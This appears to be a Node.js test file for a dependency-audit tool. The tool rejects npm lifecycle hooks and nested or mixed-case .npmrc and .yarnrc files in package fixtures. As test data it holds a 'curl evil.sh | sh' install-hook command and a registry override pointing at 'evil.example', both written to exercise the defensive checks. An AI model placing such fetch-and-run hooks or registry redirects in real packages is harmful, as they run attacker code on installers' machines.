import assert from 'node:assert/strict';
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import { describe, it } from 'node:test';

import { auditFixtureDir, auditPackageManifestText, expectedExtractedDir } from '../src/index.js';

const SHA = 'b8804442837556a2c7673caeb2925688991b610c';

describe('auditPackageManifestText — lifecycle hooks refuse execution', () => {
  it('accepts a clean manifest', () => {
    const r = auditPackageManifestText(JSON.stringify({
      name: 'x', version: '1.0.0',
      scripts: { test: 'mocha' },
      devDependencies: { axios: '^0.27.2' },
    }), 'axios');
    assert.ok(r.ok);
    assert.equal(r.declaredDependency, '^0.27.2');
  });

  for (const hook of ['preinstall', 'install', 'postinstall', 'prepare']) {
    it(`refuses ${hook} hook`, () => {
      const r = auditPackageManifestText(JSON.stringify({
        name: 'x', version: '1', scripts: { [hook]: 'curl evil.sh | sh' },
      }), 'axios');
      assert.ok(!r.ok);
      assert.equal(r.violations[0]?.code, 'lifecycle-hook-present');
    });
  }

  it('rejects invalid JSON without throwing', () => {
    assert.ok(!auditPackageManifestText('{oops', 'axios').ok);
  });
});

describe('auditFixtureDir — rc-file injection gate', () => {
  it('refuses a fixture shipping .npmrc', () => {
    const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'canary-audit-'));
    try {
      fs.writeFileSync(path.join(dir, 'package.json'), JSON.stringify({ name: 'x', version: '1', scripts: {} }));
      assert.ok(auditFixtureDir(dir, 'axios').ok);
      fs.writeFileSync(path.join(dir, '.npmrc'), 'registry=https://evil.example/');
      const r = auditFixtureDir(dir, 'axios');
      assert.ok(!r.ok);
      assert.ok(r.violations.some((v) => v.code === 'config-file-injection-risk'));
    } finally {
      fs.rmSync(dir, { recursive: true, force: true });
    }
  });

  it('F10: finds rc files nested anywhere in the pinned source', () => {
    const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'canary-audit-'));
    try {
      fs.writeFileSync(path.join(dir, 'package.json'), JSON.stringify({ name: 'x', version: '1', scripts: {} }));
      fs.mkdirSync(path.join(dir, 'tooling', 'scripts'), { recursive: true });
      fs.writeFileSync(path.join(dir, 'tooling', 'scripts', '.yarnrc'), 'registry "evil"');
      const r = auditFixtureDir(dir, 'axios');
      assert.ok(!r.ok);
      assert.ok(r.violations.some((v) => v.detail.includes('tooling/scripts/.yarnrc')));
    } finally {
      fs.rmSync(dir, { recursive: true, force: true });
    }
  });
  it('F7: refuses an UPPERCASE .NPMRC (Windows/macOS load it as project config)', () => {
    const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'canary-audit-'));
    try {
      fs.writeFileSync(path.join(dir, 'package.json'), JSON.stringify({ name: 'x', version: '1', scripts: {} }));
      assert.ok(auditFixtureDir(dir, 'axios').ok);
      // On a case-insensitive filesystem npm reads .NPMRC exactly like .npmrc;
      // the gate rejects the case-insensitive match on ALL platforms (the
      // uppercase name is meaningless-but-suspicious on Linux, fatal on Windows).
      fs.writeFileSync(path.join(dir, '.NPMRC'), 'ignore-scripts=false\n');
      const r = auditFixtureDir(dir, 'axios');
      assert.ok(!r.ok, 'uppercase .NPMRC must trip the rc gate');
      assert.ok(r.violations.some((v) => v.code === 'config-file-injection-risk' && v.detail.includes('.NPMRC')),
        JSON.stringify(r.violations));
    } finally {
      fs.rmSync(dir, { recursive: true, force: true });
    }
  });

  it('F7: also catches mixed-case nested .YarnRc.yml', () => {
    const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'canary-audit-'));
    try {
      fs.writeFileSync(path.join(dir, 'package.json'), JSON.stringify({ name: 'x', version: '1', scripts: {} }));
      fs.mkdirSync(path.join(dir, 'pkg', 'sub'), { recursive: true });
      fs.writeFileSync(path.join(dir, 'pkg', 'sub', '.YarnRc.yml'), 'enableScripts: false');
      const r = auditFixtureDir(dir, 'axios');
      assert.ok(!r.ok, 'mixed-case nested .YarnRc.yml must be found');
      assert.ok(r.violations.some((v) => v.detail.includes('pkg/sub/.YarnRc.yml')),
        JSON.stringify(r.violations));
    } finally {
      fs.rmSync(dir, { recursive: true, force: true });
    }
  });
});

describe('expectedExtractedDir', () => {
  it('matches codeload tarball root naming', () => {
    assert.equal(expectedExtractedDir('ctimmerm/axios-mock-adapter', SHA), `axios-mock-adapter-${SHA}`);
  });
});
